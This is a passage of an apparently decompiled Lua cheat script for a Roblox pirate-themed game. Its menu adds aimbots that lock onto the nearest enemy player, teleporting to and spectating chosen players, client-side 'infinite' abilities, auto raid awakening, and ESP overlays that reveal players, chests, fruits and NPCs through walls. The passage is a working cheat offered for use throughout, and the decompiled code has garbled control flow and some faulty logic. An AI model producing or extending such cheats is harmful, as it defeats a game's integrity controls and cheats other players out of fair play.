                _tp(workspace._WorldOrigin.Locations:FindFirstChild("Island 1").CFrame * CFrame.new(0, 50, 100))
            end
        end
    end
end)
v226.Raids:AddToggle("Q", {
    ["Title"] = "Auto Awakening",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p991)
    _G.Auto_Awakener = p991
end)
spawn(function()
    while wait(Sec) do
        pcall(function()
            if _G.Auto_Awakener then
                replicated.Remotes.CommF_:InvokeServer("Awakener", "Check")
                replicated.Remotes.CommF_:InvokeServer("Awakener", "Awaken")
            end
        end)
    end
end)
v226.Combat:AddSection("Combat / Aimbot")
__indexPlayer = v226.Combat:AddParagraph({
    ["Title"] = "All Players On Server :",
    ["Content"] = ""
})
spawn(function()
    while wait(Sec) do
        pcall(function()
            local v992, v993, v994 = pairs(game:GetService("Players"):GetPlayers())
            while true do
                local v995
                v994, v995 = v992(v993, v994)
                if v994 == nil then
                    break
                end
                if v994 == 12 then
                    __indexPlayer:SetDesc("All Players :" .. " " .. v994 .. " / 12 [Max]")
                elseif v994 == 1 then
                    __indexPlayer:SetDesc("All Players  :" .. " " .. v994 .. " / 12")
                else
                    __indexPlayer:SetDesc("All Players  :" .. " " .. v994 .. " / 12")
                end
            end
        end)
    end
end)
__AimBotTurn = v226.Combat:AddParagraph({
    ["Title"] = "Aimbot Status :",
    ["Content"] = ""
})
function Checking_AimStatus()
    return _G.AimCam and "Aimbot Camera" or ""
end
spawn(function()
    while wait(0.2) do
        pcall(function()
            if _G.AimMethod then
                __AimBotTurn:SetDesc("Aimbot - Skills : True")
            elseif (_G.AimCam or _G.AimbotGun) and _G.AimMethod then
                __AimBotTurn:SetDesc("Aimbot - Skills |" .. Checking_AimStatus() .. " :True")
            else
                __AimBotTurn:SetDesc("Aimbot - Skills : False")
            end
        end)
    end
end)
local v996, v997, v998 = pairs(game:GetService("Players"):GetChildren())
local vu999 = vu28
local v1000 = {}
local v1001 = {
    "AimBots Skill",
    "Auto Aimbots"
}
while true do
    local v1002
    v998, v1002 = v996(v997, v998)
    if v998 == nil then
        break
    end
    table.insert(v1000, v1002.Name)
end
v226.Combat:AddDropdown("SelectedPly", {
    ["Title"] = "Choose Players",
    ["Values"] = v1000,
    ["Multi"] = false,
    ["Default"] = 1
}):OnChanged(function(p1003)
    _G.PlayersList = p1003
end)
v226.Combat:AddToggle("Q", {
    ["Title"] = "Teleport to choose players",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p1004)
    _G.TpPly = p1004
    pcall(function()
        if _G.TpPly then
            repeat
                wait()
                _tp(game:GetService("Players")[_G.PlayersList].Character.HumanoidRootPart.CFrame)
            until not _G.TpPly
        end
    end)
end)
v226.Combat:AddToggle("Q", {
    ["Title"] = "Spectate Choose Players",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p1005)
    SpectatePlys = p1005
    repeat
        task.wait(0.1)
        workspace.Camera.CameraSubject = game:GetService("Players"):FindFirstChild(_G.PlayersList).Character.Humanoid
    until SpectatePlys == false
    workspace.Camera.CameraSubject = plr.Character.Humanoid
end)
v226.Combat:AddDropdown("Q", {
    ["Title"] = "Choose Aim Method",
    ["Values"] = v1001,
    ["Multi"] = false,
    ["Default"] = 1
}):OnChanged(function(p1006)
    ABmethod = p1006
end)
v226.Combat:AddToggle("Q", {
    ["Title"] = "Aimbot Method Skills",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p1007)
    _G.AimMethod = p1007
end)
task.spawn(function()
    while task.wait() do
        pcall(function()
            if _G.AimMethod and ABmethod == "AimBots Skill" then
                local v1008, v1009, v1010 = pairs(game:GetService("Players"):GetPlayers())
                while true do
                    local v1011
                    v1010, v1011 = v1008(v1009, v1010)
                    if v1010 == nil then
                        break
                    end
                    if v1011.Name == _G.PlayersList and v1011.Team ~= game.Players.LocalPlayer.Team then
                        MousePos = v1011.Character:FindFirstChild("HumanoidRootPart").Position
                    end
                end
            end
        end)
    end
end)
task.spawn(function()
    while task.wait() do
        pcall(function()
            if _G.AimMethod and ABmethod == "Auto Aimbots" then
                local v1012 = math.huge
                local v1013, v1014, v1015 = pairs(game:GetService("Players"):GetPlayers())
                while true do
                    local v1016
                    v1015, v1016 = v1013(v1014, v1015)
                    if v1015 == nil then
                        break
                    end
                    if v1016.Name ~= plr.Name and v1016.Team ~= game.Players.LocalPlayer.Team then
                        local v1017 = v1016:DistanceFromCharacter(plr.Character.HumanoidRootPart.Position)
                        if v1017 < v1012 then
                            MousePos = v1016.Character:FindFirstChild("HumanoidRootPart").Position
                            v1012 = v1017
                        end
                    end
                end
            end
        end)
    end
end)
v226.Combat:AddToggle("Q", {
    ["Title"] = "Aimbot Camera Closet Players",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p1018)
    _G.AimCam = p1018
end)
task.spawn(function()
    while task.wait(Sec) do
        pcall(function()
            if _G.AimCam then
                local v1019 = workspace.CurrentCamera
                function closestplayer()
                    local v1020 = math.huge
                    local v1021 = next
                    local v1022, v1023 = ply:GetPlayers()
                    local v1024 = nil
                    while true do
                        local v1025
                        v1023, v1025 = v1021(v1022, v1023)
                        if v1023 == nil then
                            break
                        end
                        if v1025 ~= plr and v1025.Character and (v1025.Character:FindFirstChild("Head") and (_G.AimCam and v1025.Character.Humanoid.Health > 0)) then
                            local v1026 = (v1025.Character.Head.Position - plr.Character.Head.Position).Magnitude
                            if v1026 < v1020 then
                                v1024 = v1025
                                v1020 = v1026
                            end
                        end
                    end
                    return v1024
                end
                repeat
                    task.wait()
                    v1019.CFrame = CFrame.new(v1019.CFrame.Position, closestplayer().Character.HumanoidRootPart.Position)
                until _G.AimCam == false or Mag > dist
            end
        end)
    end
end)
v226.Combat:AddSection("LocalPlayer Settings / Misc")
v226.Combat:AddToggle("Q", {
    ["Title"] = "Instance Mink V3 [ INF ]",
    ["Description"] = "turn on for make mink v3 infinity",
    ["Default"] = false
}):OnChanged(function(p1027)
    InfAblities = p1027
end)
spawn(function()
    while wait(0.2) do
        pcall(function()
            if InfAblities then
                if not plr.Character.HumanoidRootPart:FindFirstChild("Agility") then
                    local v1028 = replicated.FX.Agility:Clone()
                    v1028.Name = "Agility"
                    v1028.Parent = plr.Character.HumanoidRootPart
                end
            else
                plr.Character.HumanoidRootPart.Agility:Destroy()
            end
        end)
    end
end)
v226.Combat:AddToggle("Q", {
    ["Title"] = "Instance Energy [ INF ]",
    ["Description"] = "turn on for make energy infinity",
    ["Default"] = false
}):OnChanged(function(p1029)
    infEnergy = p1029
    if p1029 then
        getInfinity_Ability("Energy", infEnergy)
    end
end)
v226.Combat:AddToggle("Q", {
    ["Title"] = "Instance Soru [ INF ]",
    ["Description"] = "turn on for make soru infinity",
    ["Default"] = false
}):OnChanged(function(p1030)
    _G.InfSoru = p1030
    if p1030 then
        getInfinity_Ability("Soru", _G.InfSoru)
    end
end)
v226.Combat:AddToggle("Q", {
    ["Title"] = "Instance Observation Range [ INF ]",
    ["Description"] = "turn on for make observation range infinity",
    ["Default"] = false
}):OnChanged(function(p1031)
    _G.InfiniteObRange = p1031
    if p1031 then
        getInfinity_Ability("Observation", _G.InfiniteObRange)
    end
end)
v226.Combat:AddSection("Settings Combat / Aimbot Settings")
v226.Combat:AddToggle("Q", {
    ["Title"] = "Ignore Same Teams",
    ["Description"] = "turn on for ignore not aimbot same team",
    ["Default"] = false
}):OnChanged(function(p1032)
    _G.NoAimTeam = p1032
end)
v226.Combat:AddToggle("Q", {
    ["Title"] = "Accept Allies",
    ["Description"] = "turn on for auto accept ally",
    ["Default"] = false
}):OnChanged(function(p1033)
    _G.AcceptAlly = p1033
end)
spawn(function()
    while wait(Sec) do
        if _G.AcceptAlly then
            pcall(function()
                local v1034, v1035, v1036 = pairs(ply:GetChildren())
                while true do
                    local v1037
                    v1036, v1037 = v1034(v1035, v1036)
                    if v1036 == nil then
                        break
                    end
                    if v1037.Name ~= plr.Name and (v1037:FindFirstChild("Humanoid") and v1037:FindFirstChild("HumanoidRootPart")) then
                        replicated:WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer("AcceptAlly", v1037.Name)
                    end
                end
            end)
        end
    end
end)
v226.Combat:AddSection("Esp Items / Entity / Island")
function isnil(p1038)
    return p1038 == nil
end
local function vu1040(p1039)
    return math.floor(tonumber(p1039) + 0.5)
end
Number = math.random(1, 1000000)
function EspPly()
	-- upvalues: (ref) vu1040
    local v1041 = next
    local v1042, v1043 = game.Players:GetChildren()
    while true do
        local vu1044
        v1043, vu1044 = v1041(v1042, v1043)
        if v1043 == nil then
            break
        end
        pcall(function()
			-- upvalues: (ref) vu1044, (ref) vu1040
            if not isnil(vu1044.Character) then
                if PlayerEsp then
                    if isnil(vu1044.Character.Head) or vu1044.Character.Head:FindFirstChild("NameEsp" .. Number) then
                        vu1044.Character.Head["NameEsp" .. Number].TextLabel.Text = vu1044.Data.Level.Value .. " | " .. vu1044.Name .. " | " .. vu1040((game:GetService("Players").LocalPlayer.Character.Head.Position - vu1044.Character.Head.Position).Magnitude / 3) .. " M Health : " .. vu1040(vu1044.Character.Humanoid.Health * 100 / vu1044.Character.Humanoid.MaxHealth) .. "%"
                    else
                        local v1045 = Instance.new("BillboardGui", vu1044.Character.Head)
                        v1045.Name = "NameEsp" .. Number
                        v1045.ExtentsOffset = Vector3.new(0, 1, 0)
                        v1045.Size = UDim2.new(1, 200, 1, 30)
                        v1045.Adornee = vu1044.Character.Head
                        v1045.AlwaysOnTop = true
                        local v1046 = Instance.new("TextLabel", v1045)
                        v1046.Font = Enum.Font.Code
                        v1046.FontSize = "Size14"
                        v1046.TextWrapped = true
                        v1046.Text = vu1044.Name .. " " .. vu1040((game:GetService("Players").LocalPlayer.Character.Head.Position - vu1044.Character.Head.Position).Magnitude / 3) .. " M"
                        v1046.Size = UDim2.new(1, 0, 1, 0)
                        v1046.TextYAlignment = "Top"
                        v1046.BackgroundTransparency = 1
                        v1046.TextStrokeTransparency = 0.5
                        if vu1044.Team ~= TeamSelf then
                            v1046.TextColor3 = Color3.new(255, 0, 0)
                        else
                            v1046.TextColor3 = Color3.new(0, 0, 254)
                        end
                    end
                elseif vu1044.Character.Head:FindFirstChild("NameEsp" .. Number) then
                    vu1044.Character.Head:FindFirstChild("NameEsp" .. Number):Destroy()
                end
            end
        end)
    end
end
function LocationEsp()
	-- upvalues: (ref) vu1040
    local v1047 = next
    local v1048, v1049 = workspace._WorldOrigin.Locations:GetChildren()
    while true do
        local vu1050
        v1049, vu1050 = v1047(v1048, v1049)
        if v1049 == nil then
            break
        end
        pcall(function()
			-- upvalues: (ref) vu1050, (ref) vu1040
            if IslandESP then
                if vu1050.Name ~= "Sea" then
                    if vu1050:FindFirstChild("NameEsp") then
                        vu1050.NameEsp.TextLabel.Text = vu1050.Name .. " " .. vu1040((game:GetService("Players").LocalPlayer.Character.Head.Position - vu1050.Position).Magnitude / 3) .. " M"
                    else
                        local v1051 = Instance.new("BillboardGui", vu1050)
                        v1051.Name = "NameEsp"
                        v1051.ExtentsOffset = Vector3.new(0, 1, 0)
                        v1051.Size = UDim2.new(1, 200, 1, 30)
                        v1051.Adornee = vu1050
                        v1051.AlwaysOnTop = true
                        local v1052 = Instance.new("TextLabel", v1051)
                        v1052.Font = Enum.Font.Code
                        v1052.FontSize = "Size14"
                        v1052.TextWrapped = true
                        v1052.Size = UDim2.new(1, 0, 1, 0)
                        v1052.TextYAlignment = "Top"
                        v1052.BackgroundTransparency = 1
                        v1052.TextStrokeTransparency = 0.5
                        v1052.TextColor3 = Color3.fromRGB(98, 252, 252)
                    end
                end
            elseif vu1050:FindFirstChild("NameEsp") then
                vu1050:FindFirstChild("NameEsp"):Destroy()
            end
        end)
    end
end
function DevEsp()
	-- upvalues: (ref) vu1040
    local v1053 = next
    local v1054, v1055 = workspace:GetChildren()
    while true do
        local vu1056
        v1055, vu1056 = v1053(v1054, v1055)
        if v1055 == nil then
            break
        end
        pcall(function()
			-- upvalues: (ref) vu1056, (ref) vu1040
            if DevilFruitESP then
                if string.find(vu1056.Name, "Fruit") then
                    if vu1056.Handle:FindFirstChild("NameEsp" .. Number) then
                        vu1056.Handle["NameEsp" .. Number].TextLabel.Text = "[" .. vu1056.Name .. "]" .. " " .. vu1040((game:GetService("Players").LocalPlayer.Character.Head.Position - vu1056.Handle.Position).Magnitude / 3) .. " M"
                    else
                        local v1057 = Instance.new("BillboardGui", vu1056.Handle)
                        v1057.Name = "NameEsp" .. Number
                        v1057.ExtentsOffset = Vector3.new(0, 1, 0)
                        v1057.Size = UDim2.new(1, 200, 1, 30)
                        v1057.Adornee = vu1056.Handle
                        v1057.AlwaysOnTop = true
                        local v1058 = Instance.new("TextLabel", v1057)
                        v1058.Font = Enum.Font.Code
                        v1058.FontSize = "Size14"
                        v1058.TextWrapped = true
                        v1058.Size = UDim2.new(1, 0, 1, 0)
                        v1058.TextYAlignment = "Top"
                        v1058.BackgroundTransparency = 1
                        v1058.TextStrokeTransparency = 0.5
                        v1058.TextColor3 = Color3.fromRGB(255, 255, 255)
                        v1058.Text = vu1056.Name .. " " .. vu1040((game:GetService("Players").LocalPlayer.Character.Head.Position - vu1056.Handle.Position).Magnitude / 3) .. " M"
                    end
                end
            elseif vu1056.Handle:FindFirstChild("NameEsp" .. Number) then
                vu1056.Handle:FindFirstChild("NameEsp" .. Number):Destroy()
            end
        end)
    end
end
function flowerEsp()
	-- upvalues: (ref) vu1040
    local v1059, v1060, v1061 = pairs(workspace:GetChildren())
    while true do
        local vu1062
        v1061, vu1062 = v1059(v1060, v1061)
        if v1061 == nil then
            break
        end
        pcall(function()
			-- upvalues: (ref) vu1062, (ref) vu1040
            if vu1062.Name == "Flower2" or vu1062.Name == "Flower1" then
                if FlowerESP then
                    if vu1062:FindFirstChild("NameEsp" .. Number) then
                        vu1062["NameEsp" .. Number].TextLabel.Text = vu1062.Name .. " " .. vu1040((game:GetService("Players").LocalPlayer.Character.Head.Position - vu1062.Position).Magnitude / 3) .. " M"
                    else
                        local v1063 = Instance.new("BillboardGui", vu1062)
                        v1063.Name = "NameEsp" .. Number
                        v1063.ExtentsOffset = Vector3.new(0, 1, 0)
                        v1063.Size = UDim2.new(1, 200, 1, 30)
                        v1063.Adornee = vu1062
                        v1063.AlwaysOnTop = true
                        local v1064 = Instance.new("TextLabel", v1063)
                        v1064.Font = Enum.Font.Code
                        v1064.FontSize = "Size14"
                        v1064.TextWrapped = true
                        v1064.Size = UDim2.new(1, 0, 1, 0)
                        v1064.TextYAlignment = "Top"
                        v1064.BackgroundTransparency = 1
                        v1064.TextStrokeTransparency = 0.5
                        v1064.TextColor3 = Color3.fromRGB(88, 214, 252)
                        if vu1062.Name == "Flower1" then
                            v1064.Text = "Blue Flower" .. " " .. vu1040((game:GetService("Players").LocalPlayer.Character.Head.Position - vu1062.Position).Magnitude / 3) .. " M"
                            v1064.TextColor3 = Color3.fromRGB(88, 214, 252)
                        end
                        if vu1062.Name == "Flower2" then
                            v1064.Text = "Red Flower" .. " " .. vu1040((game:GetService("Players").LocalPlayer.Character.Head.Position - vu1062.Position).Magnitude / 3) .. " M"
                            v1064.TextColor3 = Color3.fromRGB(88, 214, 252)
                        end
                    end
                elseif vu1062:FindFirstChild("NameEsp" .. Number) then
                    vu1062:FindFirstChild("NameEsp" .. Number):Destroy()
                end
            end
        end)
    end
end
function EventIslandEsp()
	-- upvalues: (ref) vu1040
    local v1065, v1066, v1067 = pairs(workspace._WorldOrigin.Locations:GetChildren())
    while true do
        local vu1068
        v1067, vu1068 = v1065(v1066, v1067)
        if v1067 == nil then
            break
        end
        pcall(function()
			-- upvalues: (ref) vu1068, (ref) vu1040
            if EspEventIsland then
                if vu1068.Name == "Mirage Island" or (vu1068.Name == "Prehistoric Island" or vu1068.Name == "Kitsune Island") then
                    if vu1068:FindFirstChild("NameEsp") then
                        vu1068.NameEsp.TextLabel.Text = vu1068.Name .. " " .. vu1040((plr.Character.Head.Position - vu1068.Position).Magnitude / 3) .. " M"
                    else
                        local v1069 = Instance.new("BillboardGui", vu1068)
                        v1069.Name = "NameEsp"
                        v1069.ExtentsOffset = Vector3.new(0, 1, 0)
                        v1069.Size = UDim2.new(1, 200, 1, 30)
                        v1069.Adornee = vu1068
                        v1069.AlwaysOnTop = true
                        local v1070 = Instance.new("TextLabel", v1069)
                        v1070.Font = "Code"
                        v1070.FontSize = "Size14"
                        v1070.TextWrapped = true
                        v1070.Size = UDim2.new(1, 0, 1, 0)
                        v1070.TextYAlignment = "Top"
                        v1070.BackgroundTransparency = 1
                        v1070.TextStrokeTransparency = 0.5
                        v1070.TextColor3 = Color3.fromRGB(80, 245, 245)
                    end
                end
            elseif vu1068:FindFirstChild("NameEsp") then
                vu1068:FindFirstChild("NameEsp"):Destroy()
            end
        end)
    end
end
function gearEsp()
	-- upvalues: (ref) vu1040
    local v1071, v1072, v1073 = pairs(workspace.Map.MysticIsland:GetDescendants())
    while true do
        local vu1074
        v1073, vu1074 = v1071(v1072, v1073)
        if v1073 == nil then
            break
        end
        pcall(function()
			-- upvalues: (ref) vu1074, (ref) vu1040
            if ESPGear then
                if vu1074.Name == "Part" and vu1074.Material == Enum.Material.Neon then
                    if vu1074:FindFirstChild("NameEsp") then
                        vu1074.NameEsp.TextLabel.Text = "Gear" .. " " .. vu1040((plr.Character.Head.Position - vu1074.Position).Magnitude / 3) .. " M"
                    else
                        local v1075 = Instance.new("BillboardGui", vu1074)
                        v1075.Name = "NameEsp"
                        v1075.ExtentsOffset = Vector3.new(0, 1, 0)
                        v1075.Size = UDim2.new(1, 200, 1, 30)
                        v1075.Adornee = vu1074
                        v1075.AlwaysOnTop = true
                        local v1076 = Instance.new("TextLabel", v1075)
                        v1076.Font = "Code"
                        v1076.FontSize = "Size14"
                        v1076.TextWrapped = true
                        v1076.Size = UDim2.new(1, 0, 1, 0)
                        v1076.TextYAlignment = "Top"
                        v1076.BackgroundTransparency = 1
                        v1076.TextStrokeTransparency = 0.5
                        v1076.TextColor3 = Color3.fromRGB(80, 245, 245)
                    end
                end
            elseif vu1074:FindFirstChild("NameEsp") then
                vu1074:FindFirstChild("NameEsp"):Destroy()
            end
        end)
    end
end
function AdvanFruitEsp()
	-- upvalues: (ref) vu1040
    if advanEsp ~= true then
        if workspace:FindFirstChild("Adv") then
            workspace:FindFirstChild("Adv"):Destroy()
        end
    else
        local v1077, v1078, v1079 = pairs(replicated.NPCs:GetChildren())
        while true do
            local v1080
            v1079, v1080 = v1077(v1078, v1079)
            if v1079 == nil then
                break
            end
            if v1080.Name == "Advanced Fruit Dealer" then
                if workspace:FindFirstChild("Adv") then
                    if workspace:FindFirstChild("Adv") then
                        if Adv:FindFirstChild("NameEsp") then
                            Adv.NameEsp.TextLabel.Text = v1080.Name .. " " .. vu1040((plr.Character.Head.Position - v1080.HumanoidRootPart.Position).Magnitude / 3) .. " M"
                        else
                            local v1081 = Instance.new("BillboardGui", Adv)
                            v1081.Name = "NameEsp"
                            v1081.ExtentsOffset = Vector3.new(0, 1, 0)
                            v1081.Size = UDim2.new(1, 200, 1, 30)
                            v1081.Adornee = Adv
                            v1081.AlwaysOnTop = true
                            local v1082 = Instance.new("TextLabel", v1081)
                            v1082.Font = "Code"
                            v1082.FontSize = "Size14"
                            v1082.TextWrapped = true
                            v1082.Size = UDim2.new(1, 0, 1, 0)
                            v1082.TextYAlignment = "Top"
                            v1082.BackgroundTransparency = 1
                            v1082.TextStrokeTransparency = 0.5
                            v1082.TextColor3 = Color3.fromRGB(80, 245, 245)
                        end
                    end
                else
                    Adv = Instance.new("Part")
                    Adv.Name = "Adv"
                    Adv.Transparency = 1
                    Adv.Size = Vector3.new(1, 1, 1)
                    Adv.Anchored = true
                    Adv.CanCollide = false
                    Adv.Parent = workspace
                    Adv.CFrame = v1080.HumanoidRootPart.CFrame
                end
            end
        end
    end
end
function HakiClorEsp()
	-- upvalues: (ref) vu1040
    if ColorEsp ~= true then
        if workspace:FindFirstChild("Gay") then
            workspace:FindFirstChild("Gay"):Destroy()
        end
    else
        local v1083, v1084, v1085 = pairs(replicated.NPCs:GetChildren())
        while true do
            local v1086
            v1085, v1086 = v1083(v1084, v1085)
            if v1085 == nil then
                break
            end
            if v1086.Name == "Barista Cousin" then
                if workspace:FindFirstChild("Gay") then
                    if workspace:FindFirstChild("Gay") then
                        if Gay:FindFirstChild("NameEsp") then
                            Gay.NameEsp.TextLabel.Text = v1086.Name .. " " .. vu1040((plr.Character.Head.Position - v1086.HumanoidRootPart.Position).Magnitude / 3) .. " M"
                        else
                            local v1087 = Instance.new("BillboardGui", Gay)
                            v1087.Name = "NameEsp"
                            v1087.ExtentsOffset = Vector3.new(0, 1, 0)
                            v1087.Size = UDim2.new(1, 200, 1, 30)
                            v1087.Adornee = Gay
                            v1087.AlwaysOnTop = true
                            local v1088 = Instance.new("TextLabel", v1087)
                            v1088.Font = "Code"
                            v1088.FontSize = "Size14"
                            v1088.TextWrapped = true
                            v1088.Size = UDim2.new(1, 0, 1, 0)
                            v1088.TextYAlignment = "Top"
                            v1088.BackgroundTransparency = 1
                            v1088.TextStrokeTransparency = 0.5
                            v1088.TextColor3 = Color3.fromRGB(80, 245, 245)
                        end
                    end
                else
                    Gay = Instance.new("Part")
                    Gay.Name = "Gay"
                    Gay.Transparency = 1
                    Gay.Size = Vector3.new(1, 1, 1)
                    Gay.Anchored = true
                    Gay.CanCollide = false
                    Gay.Parent = workspace
                    Gay.CFrame = v1086.HumanoidRootPart.CFrame
                end
            end
        end
    end
end
function LegenSword()
	-- upvalues: (ref) vu1040
    if LegenS ~= true then
        if workspace:FindFirstChild("Lgd") then
            workspace:FindFirstChild("Lgd"):Destroy()
        end
    else
        local v1089, v1090, v1091 = pairs(replicated.NPCs:GetChildren())
        while true do
            local v1092
            v1091, v1092 = v1089(v1090, v1091)
            if v1091 == nil then
                break
            end
            if v1092.Name == "Legendary Sword Dealer " then
                if workspace:FindFirstChild("Lgd") then
                    if workspace:FindFirstChild("Lgd") then
                        if Lgd:FindFirstChild("NameEsp") then
                            Lgd.NameEsp.TextLabel.Text = v1092.Name .. " " .. vu1040((plr.Character.Head.Position - v1092.HumanoidRootPart.Position).Magnitude / 3) .. " M"
                        else
                            local v1093 = Instance.new("BillboardGui", Lgd)
                            v1093.Name = "NameEsp"
                            v1093.ExtentsOffset = Vector3.new(0, 1, 0)
                            v1093.Size = UDim2.new(1, 200, 1, 30)
                            v1093.Adornee = Lgd
                            v1093.AlwaysOnTop = true
                            local v1094 = Instance.new("TextLabel", v1093)
                            v1094.Font = "Code"
                            v1094.FontSize = "Size14"
                            v1094.TextWrapped = true
                            v1094.Size = UDim2.new(1, 0, 1, 0)
                            v1094.TextYAlignment = "Top"
                            v1094.BackgroundTransparency = 1
                            v1094.TextStrokeTransparency = 0.5
                            v1094.TextColor3 = Color3.fromRGB(80, 245, 245)
                        end
                    end
                else
                    Lgd = Instance.new("Part")
                    Lgd.Name = "Lgd"
                    Lgd.Transparency = 1
                    Lgd.Size = Vector3.new(1, 1, 1)
                    Lgd.Anchored = true
                    Lgd.CanCollide = false
                    Lgd.Parent = workspace
                    Lgd.CFrame = v1092.HumanoidRootPart.CFrame
                end
            end
        end
    end
end
function ChestEsp()
    if ChestESP then
        local v1095 = game:GetService("CollectionService")
        local v1096 = game:GetService("Players").LocalPlayer
        local v1097 = (v1096.Character or v1096.CharacterAdded:Wait()):GetPivot().Position
        local v1098 = v1095:GetTagged("_ChestTagged")
        local v1099, v1100, v1101 = ipairs(v1098)
        while true do
            local vu1102
            v1101, vu1102 = v1099(v1100, v1101)
            if v1101 == nil then
                break
            end
            local v1103
            if SelectedIsland and not vu1102:IsDescendantOf(SelectedIsland) or vu1102:GetAttribute("IsDisabled") then
                v1103 = true
				-- goto l23
            end
            local v1104, v1105 = pcall(function()
				-- upvalues: (ref) vu1102
                return vu1102:GetPivot().Position
            end)
            if not v1104 then
                if not vu1102:IsA("BasePart") then
                    v1103 = true
					-- goto l23
                end
                v1105 = vu1102.Position
            end
            local v1106 = (v1105 - v1097).Magnitude
            vu1102:GetFullName():gsub("[^%w_]", "_")
            local v1107 = vu1102:FindFirstChild("ChestEspAttachment")
            if not v1107 then
                local v1108 = Instance.new("Attachment")
                v1108.Name = "ChestEspAttachment"
                v1108.Parent = vu1102
                v1108.Position = Vector3.new(0, 3, 0)
                local v1109 = Instance.new("BillboardGui")
                v1109.Name = "NameEsp"
                v1109.Size = UDim2.new(0, 200, 0, 30)
                v1109.Adornee = v1108
                v1109.ExtentsOffset = Vector3.new(0, 1, 0)
                v1109.AlwaysOnTop = true
                v1109.Parent = v1108
                local v1110 = Instance.new("TextLabel")
                v1110.Font = Enum.Font.Code
                v1110.TextSize = 14
                v1110.TextWrapped = true
                v1110.Size = UDim2.new(1, 0, 1, 0)
                v1110.TextYAlignment = Enum.TextYAlignment.Top
                v1110.BackgroundTransparency = 1
                v1110.TextStrokeTransparency = 0.5
                v1110.TextColor3 = Color3.fromRGB(80, 245, 245)
                v1110.Parent = v1109
            end
            local v1111
            if v1107 then
                v1111 = v1107:FindFirstChild("NameEsp")
            else
                v1111 = v1107
            end
            if v1111 then
                local v1112 = math.floor(v1106 / 3)
                local v1113 = vu1102.Name:gsub("Label", "")
                v1111.TextLabel.Text = string.format("[%s] %d M", v1113, v1112)
            end
            if _G_AutoFarmChest and (v1106 <= 20 and v1107) then
                v1107:Destroy()
                v1103 = true
            else
                v1103 = true
            end
			-- ::l23::
            if not v1103 then
                break
            end
        end
    else
        local v1114, v1115, v1116 = ipairs(game:GetService("CollectionService"):GetTagged("_ChestTagged"))
        while true do
            local v1117
            v1116, v1117 = v1114(v1115, v1116)
            if v1116 == nil then
                break
            end
            local v1118 = v1117:FindFirstChild("ChestEspAttachment")
            if v1118 then
                v1118:Destroy()
            end
        end
    end
end
function berriesEsp()
    if BerryEsp then
        local v1119 = game:GetService("CollectionService")
        local v1120 = game:GetService("Players").LocalPlayer
        local v1121 = v1119:GetTagged("BerryBush")
        local v1122, v1123, v1124 = ipairs(v1121)
        while true do
            local v1125
            v1124, v1125 = v1122(v1123, v1124)
            if v1124 == nil then
                break
            end
            local v1126 = v1125.Parent:GetPivot().Position
            local v1127, v1128, v1129 = pairs(v1125:GetAttributes())
            while true do
                local v1130
                v1129, v1130 = v1127(v1128, v1129)
                if v1129 == nil then
                    break
                end
                if v1130 and (not BerryArray or table.find(BerryArray, v1130)) then
                    local v1131 = "BerryEspPart_" .. v1130 .. "_" .. tostring(v1126)
                    local v1132 = workspace:FindFirstChild(v1131)
                    if not v1132 then
                        v1132 = Instance.new("Part")
                        v1132.Name = v1131
                        v1132.Transparency = 1
                        v1132.Size = Vector3.new(1, 1, 1)
                        v1132.Anchored = true
                        v1132.CanCollide = false
                        v1132.Parent = workspace
                        v1132.CFrame = CFrame.new(v1126)
                    end
                    if not v1132:FindFirstChild("NameEsp") then
                        local v1133 = Instance.new("BillboardGui", v1132)
                        v1133.Name = "NameEsp"
                        v1133.ExtentsOffset = Vector3.new(0, 1, 0)
                        v1133.Size = UDim2.new(0, 200, 0, 30)
                        v1133.Adornee = v1132
                        v1133.AlwaysOnTop = true
                        local v1134 = Instance.new("TextLabel", v1133)
                        v1134.Font = Enum.Font.Code
                        v1134.TextSize = 14
                        v1134.TextWrapped = true
                        v1134.Size = UDim2.new(1, 0, 1, 0)
                        v1134.TextYAlignment = Enum.TextYAlignment.Top
                        v1134.BackgroundTransparency = 1
                        v1134.TextStrokeTransparency = 0.5
                        v1134.TextColor3 = Color3.fromRGB(80, 245, 245)
                        v1134.Parent = v1133
                    end
                    local v1135 = v1132:FindFirstChild("NameEsp")
                    local v1136 = (v1120.Character.Head.Position - v1126).Magnitude / 3
                    v1135.TextLabel.Text = "[" .. v1130 .. "]" .. " " .. math.round(v1136) .. " M"
                    if _G.AutoBerry and math.round(v1136) <= 20 then
                        v1132:Destroy()
                    end
                end
            end
        end
    else
        local v1137, v1138, v1139 = ipairs(workspace:GetChildren())
        while true do
            local v1140
            v1139, v1140 = v1137(v1138, v1139)
            if v1139 == nil then
                break
            end
            if v1140:IsA("Part") and v1140.Name:match("BerryEspPart_.*") then
                v1140:Destroy()
            end
        end
    end
end
v226.Combat:AddToggle("Q", {
    ["Title"] = "Esp Berries",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p1141)
    BerryEsp = p1141
    while BerryEsp do
        wait()
        berriesEsp()
    end
end)
v226.Combat:AddToggle("Q", {
    ["Title"] = "Esp Players",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p1142)
    PlayerEsp = p1142
    while PlayerEsp do
        wait()
        EspPly()
    end
end)
v226.Combat:AddToggle("Q", {
    ["Title"] = "Esp Chests",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p1143)
    ChestESP = p1143
    while ChestESP do
        wait()
        ChestEsp()
    end
end)
v226.Combat:AddToggle("Q", {
    ["Title"] = "Esp Fruits",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p1144)
    DevilFruitESP = p1144
    while DevilFruitESP do
        wait()
        DevEsp()
    end
end)
v226.Combat:AddToggle("Q", {
    ["Title"] = "Esp Island Location",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p1145)
    IslandESP = p1145
    while IslandESP do
        wait()
        LocationEsp()
    end
end)
if World2 then
    v226.Combat:AddToggle("Q", {
        ["Title"] = "Esp Flower",
        ["Description"] = "",
        ["Default"] = false
    }):OnChanged(function(p1146)
        FlowerESP = p1146
        while FlowerESP do
            wait()
            flowerEsp()
        end
    end)
    v226.Combat:AddToggle("Q", {
        ["Title"] = "Esp Legendary Sword",
        ["Description"] = "",
        ["Default"] = false
    }):OnChanged(function(p1147)
        LegenS = p1147
        while LegenS do
            wait()
